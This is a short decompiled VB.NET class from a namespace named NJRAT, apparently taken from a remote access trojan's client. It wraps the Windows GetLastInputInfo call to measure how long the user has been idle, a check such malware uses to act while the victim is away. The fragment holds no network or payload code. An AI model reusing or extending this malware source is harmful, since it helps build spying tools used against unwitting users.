Imports System
Imports System.Diagnostics
Imports System.Runtime.InteropServices

Namespace NJRAT
	' Token: 0x02000050 RID: 80
	Public NotInheritable Class GClass7
		' Token: 0x06000773 RID: 1907 RVA: 0x000020D7 File Offset: 0x000002D7
		<DebuggerNonUserCode()>
		Public Sub New()
		End Sub

		' Token: 0x06000774 RID: 1908
		Private Declare Function GetLastInputInfo Lib "User32.dll" (ByRef gstruct0_0 As GClass7.GStruct0) As Boolean

		' Token: 0x06000775 RID: 1909 RVA: 0x00042A3C File Offset: 0x00040C3C
		Public Shared Function smethod_0() As UInteger
			Dim gstruct As GClass7.GStruct0 = New GClass7.GStruct0() With { .uint_0 = Convert.ToUInt32(Marshal.SizeOf(gstruct)) }
			GClass7.GetLastInputInfo(gstruct)
			Return Convert.ToUInt32(Environment.TickCount) - gstruct.uint_1
		End Function

		' Token: 0x02000051 RID: 81
		Public Structure GStruct0
			' Token: 0x04000407 RID: 1031
			Public uint_0 As UInteger

			' Token: 0x04000408 RID: 1032
			Public uint_1 As UInteger
		End Structure
	End Class
End Namespace
